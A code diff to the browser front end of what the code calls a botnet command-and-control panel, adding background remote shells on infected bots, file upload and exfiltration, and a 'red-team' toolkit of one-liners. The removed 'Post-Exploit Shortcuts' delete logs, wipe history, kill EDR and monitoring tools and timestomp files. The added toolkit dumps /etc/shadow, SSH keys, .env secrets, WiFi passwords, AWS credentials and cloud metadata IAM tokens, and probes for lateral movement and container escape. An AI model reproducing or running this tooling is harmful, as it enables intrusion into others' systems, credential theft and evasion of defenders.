@@ -1648,9 +1648,12 @@ function renderNotifList() {
 
 var shellWS = null, shellHistory = [], shellHistIdx = -1, shellBotID = '', shellCwd = '~';
 var shellSessions = {};
+var shellBgSessions = {};  // {botID: WebSocket} — live WS kept after shell close
 var shellTabs = []; // [{botID, ws, output, cmds, cwd}]
 var activeShellTab = 0;
 var pendingFileRefresh = false;
+var shellCmdLog = [];          // [{ts, cmd}] — persistent history log
+var _shellFontSize = parseInt(localStorage.getItem('vision_shell_font_size') || '13', 10);
 
 // Tab completion definitions
 var tcCommands = [
@@ -1680,6 +1683,36 @@ function addShellTab(botID) {
   }
   shellTabs.push({ botID: botID });
   switchShellTab(shellTabs.length - 1);
+}
+
+// makeBgMessageHandler buffers output arriving while the shell modal is closed.
+function makeBgMessageHandler(botID) {
+  return function(e) {
+    try {
+      var d = JSON.parse(e.data);
+      if (!shellSessions[botID]) {
+        shellSessions[botID] = { output: '', cmds: [], cwd: '~', cmdLog: [], bgBuffer: '' };
+      }
+      var text = (d.type === 'stream_stdout' || d.type === 'stream_stderr' || d.type === 'output')
+        ? (d.output || '') : '';
+      if (text) {
+        shellSessions[botID].bgBuffer = (shellSessions[botID].bgBuffer || '') + text;
+      }
+    } catch (ex) {}
+  };
+}
+
+// updateBgIndicators adds/removes .shell-bg-active on bot rows with live bg sessions.
+function updateBgIndicators() {
+  document.querySelectorAll('#bot-tbody tr.bot-row').forEach(function(r) {
+    var id = r.getAttribute('data-botid');
+    if (shellBgSessions[id] && shellBgSessions[id].readyState === WebSocket.OPEN) {
+      r.classList.add('shell-bg-active');
+    } else {
+      r.classList.remove('shell-bg-active');
+      if (shellBgSessions[id]) delete shellBgSessions[id];
+    }
+  });
 }
 
 function activateShellTab(idx) {
@@ -1713,11 +1746,13 @@ function activateShellTab(idx) {
     output.innerHTML = saved.output;
     shellHistory = saved.cmds.slice();
     shellCwd = saved.cwd || '~';
+    shellCmdLog = (saved.cmdLog || []).slice();
     output.scrollTop = output.scrollHeight;
   } else {
     output.innerHTML = '';
     shellHistory = [];
     shellCwd = '~';
+    shellCmdLog = [];
   }
 
   updateBreadcrumb();
@@ -1725,41 +1760,53 @@ function activateShellTab(idx) {
   shellHistIdx = shellHistory.length;
   renderShellTabs();
   overlay.classList.add('open');
+  // Apply saved font size
+  document.querySelectorAll('.shell-output').forEach(function (el) { el.style.fontSize = _shellFontSize + 'px'; });
   input.focus();
 
-  // Connect WebSocket
-  if (shellWS) { shellWS.close(); shellWS = null; }
-  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
+  // Connect WebSocket — reuse a live background session if one exists for this bot
+  var _bgWS = shellBgSessions[tab.botID];
+  var _reusingBg = _bgWS && _bgWS.readyState === WebSocket.OPEN;
+  if (shellWS && shellWS !== _bgWS) { shellWS.close(); shellWS = null; }
+  if (_reusingBg) {
+    shellWS = _bgWS;
+    delete shellBgSessions[tab.botID];
+    updateBgIndicators();
+  } else {
+    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
+  }
+
   shellWS.onmessage = function (e) {
     try {
       var d = JSON.parse(e.data);
+      // Streaming stdout/stderr frames (Tier 2)
+      if (d.type === 'stream_stdout') { appendOutput(d.output || ''); return; }
+      if (d.type === 'stream_stderr') { appendStderrOutput(d.output || ''); return; }
+      if (d.type === 'stream_start') { appendOutput('[streaming...]\n'); return; }
+      // File download frame (Tier 3)
+      if (d.type === 'file' && d.name && d.data) { shellTriggerDownload(d.name, d.data); return; }
       if (d.output) {
         // Check for combined cd+ls output (---LS--- marker from server-side cd handler)
         var lsMarker = d.output.indexOf('---LS---');
         if (lsMarker !== -1) {
           var beforeLs = d.output.substring(0, lsMarker);
           var lsOutput = d.output.substring(lsMarker + 9);
-          // Show only the cd output (pwd line) in terminal, not the ls dump
           appendOutput(beforeLs);
-          // Parse pwd from the pre-marker section
           var pwdLine = beforeLs.trim();
           if (pwdLine.match(/^\/[^\n]*$/) && !pwdLine.match(/\s/)) {
             shellCwd = pwdLine;
             document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
             updateBreadcrumb();
           }
-          // Parse file listing
           parseFileList(lsOutput);
         } else {
           appendOutput(d.output);
-          // If we requested a file listing, parse it
           var trimmed = d.output.trim();
           if (pendingFileRefresh && (trimmed.match(/^total\s/m) || trimmed.match(/^[drwxlsStT\-]{10}\s/m))) {
             pendingFileRefresh = false;
             parseFileList(d.output);
           }
-          // Check if output is a pwd result (single line starting with /)
           if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
             shellCwd = trimmed;
             document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
@@ -1769,17 +1816,38 @@ function activateShellTab(idx) {
       }
     } catch (ex) { }
   };
+
+  function shellTriggerDownload(name, b64data) {
+    try {
+      var bytes = atob(b64data);
+      var arr = new Uint8Array(bytes.length);
+      for (var i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
+      var blob = new Blob([arr], { type: 'application/octet-stream' });
+      var url = URL.createObjectURL(blob);
+      var a = document.createElement('a');
+      a.href = url; a.download = name; a.click();
+      URL.revokeObjectURL(url);
+      showToast('Downloaded: ' + name, true);
+    } catch (ex) { showToast('Download failed: ' + ex.message, false); }
+  }
   shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
 
-  shellWS.onopen = function () {
-    if (!saved) {
-      // New session — navigate to / so file tree shows full filesystem root
-      shellWS.send(JSON.stringify({ command: 'cd /' }));
-    } else {
-      // Restored session — repopulate file browser for the saved cwd
-      setTimeout(function () { refreshFiles(); }, 100);
-    }
-  };
+  if (_reusingBg) {
+    // Flush any output buffered while the shell was in the background
+    var _bgBuf = saved && saved.bgBuffer;
+    if (_bgBuf) { saved.bgBuffer = ''; appendOutput(_bgBuf); }
+    setTimeout(function () { refreshFiles(); }, 100);
+  } else {
+    shellWS.onopen = function () {
+      if (!saved) {
+        // New session — navigate to / so file tree shows full filesystem root
+        shellWS.send(JSON.stringify({ command: 'cd /' }));
+      } else {
+        // Restored session — repopulate file browser for the saved cwd
+        setTimeout(function () { refreshFiles(); }, 100);
+      }
+    };
+  }
 }
 
 function switchShellTab(idx) {
@@ -1788,7 +1856,7 @@ function switchShellTab(idx) {
   if (shellBotID) {
     shellSessions[shellBotID] = {
       output: document.getElementById('shell-output').innerHTML,
-      cmds: shellHistory.slice(), cwd: shellCwd
+      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice()
     };
   }
   activateShellTab(idx);
@@ -1797,10 +1865,21 @@ function switchShellTab(idx) {
 function closeShellTab(idx) {
   if (shellTabs.length <= 1) { closeShell(); return; }
   var tab = shellTabs[idx];
-  if (tab.botID === shellBotID && shellWS) { shellWS.close(); shellWS = null; }
+  if (tab.botID === shellBotID && shellWS) {
+    if (shellWS.readyState === WebSocket.OPEN) {
+      var _bgBot = tab.botID;
+      shellBgSessions[_bgBot] = shellWS;
+      shellWS.onmessage = makeBgMessageHandler(_bgBot);
+      shellWS.onclose = function () { delete shellBgSessions[_bgBot]; updateBgIndicators(); };
+    } else {
+      shellWS.close();
+    }
+    shellWS = null;
+  }
   shellTabs.splice(idx, 1);
   if (activeShellTab >= shellTabs.length) activeShellTab = shellTabs.length - 1;
   activateShellTab(activeShellTab);
+  updateBgIndicators();
 }
 
 function renderShellTabs() {
@@ -1818,13 +1897,28 @@ function closeShell() {
   if (shellBotID) {
     shellSessions[shellBotID] = {
       output: document.getElementById('shell-output').innerHTML,
-      cmds: shellHistory.slice(), cwd: shellCwd
+      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice(), bgBuffer: ''
     };
   }
   document.getElementById('shell-overlay').classList.remove('open');
-  if (shellWS) { shellWS.close(); shellWS = null; }
+  if (shellWS) {
+    if (shellBotID && shellWS.readyState === WebSocket.OPEN) {
+      // Park the connection in the background rather than closing it
+      var _bgBot = shellBotID;
+      shellBgSessions[_bgBot] = shellWS;
+      shellWS.onmessage = makeBgMessageHandler(_bgBot);
+      shellWS.onclose = function () {
+        delete shellBgSessions[_bgBot];
+        updateBgIndicators();
+      };
+    } else {
+      shellWS.close();
+    }
+    shellWS = null;
+  }
   shellTabs = [];
   document.getElementById('tab-complete').style.display = 'none';
+  updateBgIndicators();
 }
 
 function parseAnsi(text) {
@@ -1871,16 +1965,49 @@ function parseAnsi(text) {
   return frag;
 }
 
+function parseClickableOutput(text) {
+  var frag = document.createDocumentFragment();
+  // Skip heavy parsing on long lines (guards against base64/binary output)
+  if (text.length > 200) { frag.appendChild(document.createTextNode(text)); return frag; }
+  var re = /(\b(?:\d{1,3}\.){3}\d{1,3}\b)|(\/[a-zA-Z0-9._\-][a-zA-Z0-9._\-\/]*)/g;
+  var last = 0, m;
+  while ((m = re.exec(text)) !== null) {
+    if (m.index > last) frag.appendChild(document.createTextNode(text.slice(last, m.index)));
+    var val = m[0], span = document.createElement('span');
+    span.textContent = val;
+    if (m[1]) {
+      span.className = 'out-ip'; span.title = 'Copy IP';
+      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('Copied: ' + v, true); }; })(val);
+    } else {
+      span.className = 'out-path'; span.title = 'Navigate to path';
+      span.onclick = (function (v) { return function () { shellCd(v); }; })(val);
+    }
+    frag.appendChild(span);
+    last = m.index + val.length;
+  }
+  if (last < text.length) frag.appendChild(document.createTextNode(text.slice(last)));
+  return frag;
+}
+
 function appendOutput(text) {
   var el = document.getElementById('shell-output');
+  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
   if (text.indexOf('\x1b[') !== -1) {
     el.appendChild(parseAnsi(text));
   } else {
-    var span = document.createElement('span');
-    span.textContent = text;
-    el.appendChild(span);
+    el.appendChild(parseClickableOutput(text));
   }
-  el.scrollTop = el.scrollHeight;
+  if (nearBottom) el.scrollTop = el.scrollHeight;
+}
+
+function appendStderrOutput(text) {
+  var el = document.getElementById('shell-output');
+  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
+  var span = document.createElement('span');
+  span.style.color = 'var(--red, #f44)';
+  span.textContent = text;
+  el.appendChild(span);
+  if (nearBottom) el.scrollTop = el.scrollHeight;
 }
 
 // ---------------------------------------------------------------------------
@@ -1984,10 +2111,92 @@ function parseFileList(output) {
     } else {
       click = 'onclick="shellSendCmd(\'cat ' + e.name.replace(/'/g, "\\'") + '\')"';
     }
-    html += '<div class="' + cls + '" ' + click + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span></div>';
+    var ctx = 'oncontextmenu="event.preventDefault();showFileCtx(event,\'' + e.name.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + '\',' + (e.isDir ? 'true' : 'false') + ')"';
+    html += '<div class="' + cls + '" ' + click + ' ' + ctx + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span></div>';
   });
   wrap.innerHTML = html;
 }
+
+// ---------------------------------------------------------------------------
+// File context menu
+// ---------------------------------------------------------------------------
+
+var _ctxEntry = null;
+
+function showFileCtx(e, name, isDir) {
+  _ctxEntry = { name: name, isDir: isDir, cwd: shellCwd };
+  var m = document.getElementById('file-ctx-menu');
+  document.getElementById('ctx-cd-item').style.display = isDir ? '' : 'none';
+  document.getElementById('ctx-cat-item').style.display = !isDir ? '' : 'none';
+  document.getElementById('ctx-chmod-item').style.display = !isDir ? '' : 'none';
+  var x = e.clientX, y = e.clientY;
+  if (x + 170 > window.innerWidth) x = window.innerWidth - 175;
+  if (y + 220 > window.innerHeight) y = window.innerHeight - 225;
+  m.style.left = x + 'px'; m.style.top = y + 'px'; m.style.display = 'block';
+  e.stopPropagation();
+}
+
+function hideFileCtx() {
+  var m = document.getElementById('file-ctx-menu');
+  if (m) m.style.display = 'none';
+}
+
+document.addEventListener('click', hideFileCtx);
+document.addEventListener('keydown', function (e) { if (e.key === 'Escape') hideFileCtx(); });
+
+function _ctxPath() {
+  if (!_ctxEntry) return '';
+  var base = _ctxEntry.cwd === '~' ? '' : _ctxEntry.cwd;
+  return (base ? base + '/' : '') + _ctxEntry.name;
+}
+
+function ctxCopyPath() {
+  var p = _ctxPath();
+  try { navigator.clipboard.writeText(p); } catch (e) { }
+  showToast('Copied: ' + p, true); hideFileCtx();
+}
+
+function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
+
+function ctxCat() { shellSendCmd('cat ' + _shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
+
+function ctxChmod() {
+  var m = prompt('chmod mode (octal):', '755');
+  hideFileCtx();
+  if (!m) return;
+  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  shellWS.send(JSON.stringify({ command: '!chmod ' + m + ' ' + _ctxPath() }));
+  setTimeout(refreshFiles, 600);
+}
+
+function ctxDelete() {
+  if (!confirm('Delete ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
+  if (!shellWS || shellWS.readyState !== 1) { hideFileCtx(); showToast('Not connected', false); return; }
+  if (_ctxEntry.isDir) {
+    shellSendCmd('rm -rf ' + _shellQuoteJs(_ctxEntry.name));
+  } else {
+    shellWS.send(JSON.stringify({ command: '!rm ' + _ctxPath() }));
+  }
+  hideFileCtx(); setTimeout(refreshFiles, 800);
+}
+
+function ctxRename() {
+  var n = prompt('Rename to:', _ctxEntry.name);
+  hideFileCtx();
+  if (!n || n === _ctxEntry.name) return;
+  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  var dst = (_ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + n : n;
+  shellWS.send(JSON.stringify({ command: '!mv ' + _ctxPath() + ' ' + dst }));
+  setTimeout(refreshFiles, 600);
+}
+
+function ctxDownload() {
+  hideFileCtx();
+  if (_ctxEntry.isDir) { showToast('Cannot download a directory', false); return; }
+  shellDownloadFile(_ctxEntry.name);
+}
+
+function _shellQuoteJs(s) { return "'" + s.replace(/'/g, "'\\''") + "'"; }
 
 function shellSendCmd(cmd) {
   if (!shellWS || shellWS.readyState !== 1) return;
@@ -1995,7 +2204,38 @@ function shellSendCmd(cmd) {
   appendOutput(p + ' ' + cmd + '\n');
   shellWS.send(JSON.stringify({ command: cmd }));
   shellHistory.push(cmd);
+  shellCmdLog.push({ ts: Date.now(), cmd: cmd });
   shellHistIdx = shellHistory.length;
+}
+
+// Sends a !download command; the CNC relays the file back as a {type:"file"} WS frame.
+function shellDownloadFile(name) {
+  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  var path = (_ctxEntry && _ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + name : name;
+  shellSendCmd('!download ' + path);
+}
+
+// Triggers the hidden file input to pick a file for upload.
+function shellUploadFile() {
+  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  document.getElementById('shell-upload-input').value = '';
+  document.getElementById('shell-upload-input').click();
+}
+
+// Called by the file input's onchange — reads the file as base64 and sends to bot.
+function shellHandleUpload(input) {
+  var file = input.files && input.files[0];
+  if (!file || !shellWS || shellWS.readyState !== 1) return;
+  if (file.size > 10 * 1024 * 1024) { showToast('File too large (>10MB)', false); return; }
+  var destDir = shellCwd && shellCwd !== '~' ? shellCwd : '/tmp';
+  var destPath = destDir + '/' + file.name;
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    var b64 = e.target.result.split(',')[1];
+    appendOutput('[upload] sending ' + file.name + ' (' + file.size + ' bytes)...\n');
+    shellWS.send(JSON.stringify({ type: 'upload', fileName: destPath, data: b64 }));
+  };
+  reader.readAsDataURL(file);
 }
 
 // ---------------------------------------------------------------------------
@@ -2087,10 +2327,18 @@ function saveShellHistory() {
 function clearShellHistory() {
   document.getElementById('shell-output').innerHTML = '';
   document.getElementById('file-list').innerHTML = '<div class="file-empty">Send a command to populate</div>';
-  shellHistory = []; shellHistIdx = 0; shellCwd = '~';
+  shellHistory = []; shellHistIdx = 0; shellCwd = '~'; shellCmdLog = [];
   document.getElementById('shell-prompt').textContent = '~$ ';
   updateBreadcrumb();
   if (shellBotID) delete shellSessions[shellBotID];
+}
+
+function shellZoom(delta) {
+  _shellFontSize = Math.max(9, Math.min(22, _shellFontSize + delta));
+  document.querySelectorAll('.shell-output').forEach(function (el) {
+    el.style.fontSize = _shellFontSize + 'px';
+  });
+  localStorage.setItem('vision_shell_font_size', _shellFontSize);
 }
 
 function shellNetScan() {
@@ -2105,79 +2353,175 @@ function shellStartSocks() {
 }
 
 // ---------------------------------------------------------------------------
-// Post-Exploit Shortcuts
+// Toolkit — 100+ red-team one-liners in 16 categories
 // ---------------------------------------------------------------------------
 
-var postExShortcuts = [
-  { cat: 'Quick Actions', items: [
-    { name: 'Persist All', desc: 'Install cron/startup persistence', cmd: '!persist' },
-    { name: 'Reinstall All', desc: 'Force re-download bot binary', cmd: '!reinstall' },
-    { name: 'Flush Firewall', desc: 'Drop all iptables rules', cmd: 'iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT' },
-    { name: 'Kill Logging', desc: 'Stop syslog and clear logs', cmd: 'service rsyslog stop 2>/dev/null; service syslog-ng stop 2>/dev/null; rm -rf /var/log/*.log /var/log/syslog /var/log/auth.log' },
-    { name: 'Clear History', desc: 'Wipe shell history + unset', cmd: 'history -c; rm -f ~/.bash_history ~/.zsh_history; unset HISTFILE HISTSIZE' },
-    { name: 'Kill Monitors', desc: 'Stop common EDR/monitoring', cmd: "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig|tcpdump|wireshark' 2>/dev/null" },
-    { name: 'Disable Cron', desc: 'Stop cron daemon (anti-cleanup)', cmd: 'service cron stop 2>/dev/null; service crond stop 2>/dev/null' },
-    { name: 'Timestomp', desc: 'Set file timestamps to 2023', cmd: 'find /tmp -maxdepth 1 -newer /etc/hostname -exec touch -t 202301010000 {} \\;' },
-    { name: 'DNS Flush', desc: 'Clear DNS resolver cache', cmd: 'resolvectl flush-caches 2>/dev/null; systemd-resolve --flush-caches 2>/dev/null; nscd -i hosts 2>/dev/null' },
-    { name: 'Kill Sysmon', desc: 'Stop sysmon for linux', cmd: 'service sysmonforlinux stop 2>/dev/null; pkill -9 sysmon 2>/dev/null' }
-  ]},
-  { cat: 'Recon', items: [
-    { name: 'System Info', desc: 'OS, kernel, hostname', cmd: 'uname -a; cat /etc/*release 2>/dev/null | head -5; hostname' },
-    { name: 'Network Info', desc: 'Interfaces, routes, DNS', cmd: 'ip -br a; ip route show default; cat /etc/resolv.conf 2>/dev/null | grep nameserver' },
-    { name: 'Open Ports', desc: 'Listening ports and PIDs', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
-    { name: 'Users w/ Shell', desc: 'Accounts with login shell', cmd: "grep -v -E 'nologin|false|sync|halt|shutdown' /etc/passwd" },
-    { name: 'SUID Binaries', desc: 'Find setuid executables', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
-    { name: 'Writable Dirs', desc: 'World-writable directories', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | head -20' },
-    { name: 'Cron Jobs', desc: 'All scheduled tasks', cmd: 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null' },
-    { name: 'Docker/LXC', desc: 'Container environment check', cmd: 'docker ps 2>/dev/null; lxc list 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5' },
-    { name: 'SSH Keys', desc: 'Find private keys on disk', cmd: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null" },
-    { name: 'Credentials', desc: 'Config files with passwords', cmd: "grep -rl 'password\\|passwd\\|credential' /etc/ /opt/ /var/www/ 2>/dev/null | head -15" },
-    { name: 'Sudo Check', desc: 'Sudo permissions for user', cmd: "sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'" },
-    { name: 'Proc Tree', desc: 'Running process tree', cmd: 'ps auxf --width 200 2>/dev/null | head -30 || ps aux | head -30' },
-    { name: 'Kernel Version', desc: 'Kernel + possible exploits', cmd: 'uname -r; cat /proc/version' },
-    { name: 'Mount Points', desc: 'Mounted filesystems', cmd: "mount | grep -v -E 'proc|sys|cgroup|tmpfs'" }
-  ]}
+var toolkitItems = [
+  { cat: 'Recon' },
+  { name: 'Net Scan', cmd: 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
+  { name: 'System Info', cmd: 'echo "=== HOSTNAME ===" && hostname && echo "=== KERNEL ===" && uname -a && echo "=== DISTRO ===" && cat /etc/*release 2>/dev/null | head -5 && echo "=== UPTIME ===" && uptime && echo "=== CPU ===" && nproc && echo "=== RAM ===" && free -h' },
+  { name: 'Who / Users', cmd: 'echo "=== LOGGED IN ===" && w 2>/dev/null || who && echo "=== /etc/passwd (shells) ===" && grep -v nologin /etc/passwd | grep -v /false' },
+  { name: 'Disk Usage', cmd: 'df -h 2>/dev/null && echo "=== MOUNTS ===" && mount | grep -v cgroup | grep -v proc' },
+  { name: 'Running Procs', cmd: 'ps aux --sort=-%mem 2>/dev/null | head -25 || ps aux | head -25' },
+  { name: 'Open Ports', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' },
+  { name: 'DNS Config', cmd: 'cat /etc/resolv.conf 2>/dev/null && echo "=== HOSTS ===" && cat /etc/hosts' },
+  { cat: 'Credentials' },
+  { name: 'SSH Keys', cmd: 'echo "=== AUTHORIZED ===" && cat ~/.ssh/authorized_keys 2>/dev/null; for u in $(ls /home/); do echo "=== /home/$u ===" && cat /home/$u/.ssh/authorized_keys 2>/dev/null; done; echo "=== HOST KEYS ===" && ls -la /etc/ssh/ssh_host_* 2>/dev/null' },
+  { name: 'Bash History', cmd: 'cat ~/.bash_history 2>/dev/null | tail -50; for u in $(ls /home/); do echo "=== $u ===" && cat /home/$u/.bash_history 2>/dev/null | tail -20; done' },
+  { name: 'Passwd / Shadow', cmd: 'cat /etc/passwd && echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null || echo "(no read access to shadow)"' },
+  { name: 'Env / Secrets', cmd: 'env | grep -iE "pass|key|token|secret|api|auth|cred" 2>/dev/null; echo "=== .env files ===" && find / -name ".env" -readable 2>/dev/null | head -10' },
+  { name: 'SSH Config', cmd: 'cat ~/.ssh/config 2>/dev/null; echo "=== Known Hosts ===" && cat ~/.ssh/known_hosts 2>/dev/null | head -20' },
+  { name: 'WiFi Passwords', cmd: 'find /etc/NetworkManager/system-connections/ -name "*.nmconnection" 2>/dev/null | xargs grep -H psk= 2>/dev/null; cat /etc/wpa_supplicant/*.conf 2>/dev/null | grep -A3 "network=" | grep -E "ssid|psk"' },
+  { name: 'History (all shells)', cmd: 'cat ~/.bash_history ~/.zsh_history ~/.ash_history ~/.history 2>/dev/null | grep -iE "pass|token|key|secret|curl.*-u|wget.*--password|mysql.*-p|sshpass" | sort -u | tail -30' },
+  { name: 'Database Configs', cmd: 'cat /etc/mysql/debian.cnf 2>/dev/null; cat /etc/my.cnf 2>/dev/null | grep -i pass; cat /var/www/*/wp-config.php 2>/dev/null | grep -i "DB_"; find / -name "config.php" -path "*/phpmyadmin/*" 2>/dev/null | xargs grep -i "pass" 2>/dev/null | head -10' },
+  { cat: 'Persistence' },
+  { name: 'Crontabs', cmd: 'echo "=== ROOT CRONTAB ===" && crontab -l 2>/dev/null; echo "=== SYSTEM CRON ===" && ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/ 2>/dev/null' },
+  { name: 'Systemd Services', cmd: 'systemctl list-units --type=service --state=running 2>/dev/null | head -30 || ls /etc/init.d/ 2>/dev/null' },
+  { name: 'Startup Files', cmd: 'cat /etc/rc.local 2>/dev/null; echo "=== PROFILE ===" && cat /etc/profile.d/*.sh 2>/dev/null | head -20; echo "=== BASHRC ===" && cat ~/.bashrc 2>/dev/null | tail -10' },
+  { cat: 'Lateral Movement' },
+  { name: 'ARP Neighbors', cmd: 'ip neigh 2>/dev/null || arp -a 2>/dev/null' },
+  { name: 'Internal Hosts', cmd: 'cat /etc/hosts && echo "=== KNOWN SSH ===" && cat ~/.ssh/known_hosts 2>/dev/null | awk "{print \\$1}" | sort -u | head -20' },
+  { name: 'Docker / LXC', cmd: 'echo "=== DOCKER ===" && docker ps -a 2>/dev/null || echo "(no docker)"; echo "=== LXC ===" && lxc list 2>/dev/null || echo "(no lxc)"; echo "=== CONTAINERS ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
+  { name: 'Network Shares', cmd: 'echo "=== NFS ===" && showmount -e 127.0.0.1 2>/dev/null || echo "(no nfs)"; echo "=== SMB ===" && smbclient -L 127.0.0.1 -N 2>/dev/null || echo "(no smb)"; echo "=== FSTAB ===" && grep -v "^#" /etc/fstab 2>/dev/null' },
+  { name: 'SSH Keys (all)', cmd: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null | while read f; do echo "=== $f ==="; head -2 "$f" 2>/dev/null; echo ""; done | head -50' },
+  { name: 'SSH Agent Sockets', cmd: 'find /tmp -name "agent.*" -type s 2>/dev/null; ls -la /tmp/ssh-* 2>/dev/null; echo "=== ENV ===" && env | grep SSH_AUTH_SOCK' },
+  { name: 'Internal Subnets', cmd: 'ip route 2>/dev/null || route -n 2>/dev/null; echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null | grep inet | awk "{print \\$2}"' },
+  { cat: 'Cloud' },
+  { name: 'AWS IMDSv1', cmd: 'curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ && echo "" && echo "=== IDENTITY ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && echo "=== CREDS ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | xargs -I{} curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/{}' },
+  { name: 'AWS IMDSv2', cmd: 'TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) && echo "Token: $TOKEN" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
+  { name: 'GCP Metadata', cmd: 'curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json" 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null' },
+  { name: 'Azure IMDS', cmd: 'curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool 2>/dev/null; echo "=== MSI TOKEN ===" && curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null' },
+  { name: 'Cloud Provider', cmd: 'echo "=== CHECKING ===" && curl -sf --connect-timeout 1 http://169.254.169.254/latest/meta-data/ami-id 2>/dev/null && echo "AWS" || true; curl -sf --connect-timeout 1 -H "Metadata-Flavor: Google" http://metadata.google.internal/ 2>/dev/null && echo "GCP" || true; curl -sf --connect-timeout 1 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-01-01" 2>/dev/null && echo "Azure" || true' },
+  { name: 'AWS CLI Keys', cmd: 'cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; find / -name "credentials" -path "*/.aws/*" 2>/dev/null | xargs cat 2>/dev/null' },
+  { name: 'K8s Service Acct', cmd: 'echo "=== K8S TOKEN ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-80; echo "" && echo "=== NAMESPACE ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "=== API SERVER ===" && env | grep -i kube' },
+  { name: 'Container Escape', cmd: 'echo "=== PRIVILEGED ===" && cat /proc/self/status | grep -i cap; echo "=== DOCKER SOCKET ===" && ls -la /var/run/docker.sock 2>/dev/null || echo "(no docker socket)"; echo "=== HOST MOUNTS ===" && cat /proc/mounts | grep -v tmpfs | grep -v cgroup; echo "=== CGROUP ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
+  { cat: 'Docker Recon' },
+  { name: 'Docker Enumerate', cmd: 'echo "=== CONTAINERS ===" && docker ps -a --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}" 2>/dev/null; echo "=== IMAGES ===" && docker images --format "table {{.Repository}}\\t{{.Tag}}\\t{{.Size}}" 2>/dev/null; echo "=== NETWORKS ===" && docker network ls 2>/dev/null; echo "=== VOLUMES ===" && docker volume ls 2>/dev/null' },
